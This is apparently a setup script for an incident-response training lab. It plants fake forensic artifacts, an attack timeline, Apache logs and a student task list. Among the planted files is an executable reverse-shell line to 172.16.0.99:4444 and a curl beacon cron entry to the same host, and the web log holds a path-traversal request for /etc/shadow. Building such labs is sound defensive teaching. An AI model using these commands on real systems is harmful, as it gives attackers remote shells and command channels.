#!/bin/bash
# Module 14: Alert & Incident Response
# Plant forensic artifacts, multi-stage attack timeline, C2 traffic patterns

echo "[module-14] Setting up Alert & Incident Response lab..."

mkdir -p /opt/forensics /opt/timeline /opt/evidence /var/log/apache2

# Plant suspicious files with unusual timestamps
echo "#!/bin/bash" > /opt/forensics/backdoor.sh
echo "bash -i >& /dev/tcp/172.16.0.99/4444 0>&1" >> /opt/forensics/backdoor.sh
chmod +x /opt/forensics/backdoor.sh
touch -t 202503010215 /opt/forensics/backdoor.sh  # timestamp during attack window

echo "c2_server=172.16.0.99" > /opt/forensics/.hidden_config
echo "exfil_port=8443" >> /opt/forensics/.hidden_config
touch -t 202503010216 /opt/forensics/.hidden_config

# Create suspicious cron entry
echo "*/5 * * * * curl -s http://172.16.0.99:8080/beacon > /dev/null 2>&1" > /opt/forensics/suspicious_cron

# Multi-stage attack timeline in logs
cat > /opt/timeline/attack-timeline.log << 'TIMELINE'
2025-03-01 02:10:00 [RECON] Port scan detected from 10.10.0.50 (SYN scan on ports 1-1024)
2025-03-01 02:13:00 [RECON] Service enumeration detected - nmap -sV from 10.10.0.50
2025-03-01 02:14:00 [BRUTE] SSH brute force started from 10.10.0.50 targeting root
2025-03-01 02:14:10 [BREACH] SSH login successful for root from 10.10.0.50
2025-03-01 02:15:00 [PERSIST] New file created: /opt/forensics/backdoor.sh (reverse shell)
2025-03-01 02:16:00 [PERSIST] Hidden config written: /opt/forensics/.hidden_config
2025-03-01 02:17:00 [PERSIST] Cron job added for C2 beacon every 5 minutes
2025-03-01 02:20:00 [LATERAL] Web application reconnaissance from compromised host
2025-03-01 02:30:00 [EXFIL] Outbound connection to 172.16.0.99:8443 detected
2025-03-01 03:00:00 [C2] Periodic beacon to 172.16.0.99:8080 (every 5 min)
TIMELINE

# Create evidence collection script
cat > /opt/evidence/collect.sh << 'SCRIPT'
#!/bin/bash
echo "=== Evidence Collection Script ==="
echo "Date: $(date)"
echo ""
echo "=== Running Processes ==="
ps auxf
echo ""
echo "=== Network Connections ==="
ss -tlnp
echo ""
echo "=== Recent File Modifications ==="
find / -mtime -1 -type f 2>/dev/null | head -50
echo ""
echo "=== Cron Jobs ==="
for user in $(cut -f1 -d: /etc/passwd); do crontab -u "$user" -l 2>/dev/null; done
echo ""
echo "=== Login History ==="
last -20
echo ""
echo "=== Hidden Files in /opt ==="
find /opt -name ".*" -type f
SCRIPT
chmod +x /opt/evidence/collect.sh

# Pre-populate Apache log with attack pattern
cat > /var/log/apache2/access.log << 'WEBLOG'
10.10.0.50 - - [01/Mar/2025:02:20:00 +0000] "GET / HTTP/1.1" 200 1234
10.10.0.50 - - [01/Mar/2025:02:20:01 +0000] "GET /robots.txt HTTP/1.1" 200 45
10.10.0.50 - - [01/Mar/2025:02:20:02 +0000] "GET /admin HTTP/1.1" 403 567
10.10.0.50 - - [01/Mar/2025:02:20:03 +0000] "GET /../../../etc/shadow HTTP/1.1" 400 0
10.10.0.50 - - [01/Mar/2025:02:20:04 +0000] "GET /cgi-bin/shell.cgi HTTP/1.1" 404 0
10.10.0.50 - - [01/Mar/2025:02:30:00 +0000] "POST /upload HTTP/1.1" 200 89
172.16.0.99 - - [01/Mar/2025:03:00:00 +0000] "GET /beacon HTTP/1.1" 200 12
172.16.0.99 - - [01/Mar/2025:03:05:00 +0000] "GET /beacon HTTP/1.1" 200 12
172.16.0.99 - - [01/Mar/2025:03:10:00 +0000] "GET /beacon HTTP/1.1" 200 12
WEBLOG

cat > /home/student/README.txt << 'EOF'
Alert & Incident Response Lab
================================
Tasks:
1. Review the attack timeline in /opt/timeline/attack-timeline.log
2. Investigate forensic artifacts in /opt/forensics/
3. Run the evidence collection script: /opt/evidence/collect.sh
4. Analyze web logs in /var/log/apache2/access.log for attack patterns
5. Identify the C2 infrastructure (IP, ports, beacon interval)
6. Create an incident report with:
   - Attack vector (how the attacker got in)
   - Persistence mechanisms
   - Indicators of Compromise (IOCs)
   - Recommended remediation steps
EOF
chown student:student /home/student/README.txt 2>/dev/null || true

echo "[module-14] Alert & Incident Response lab ready."
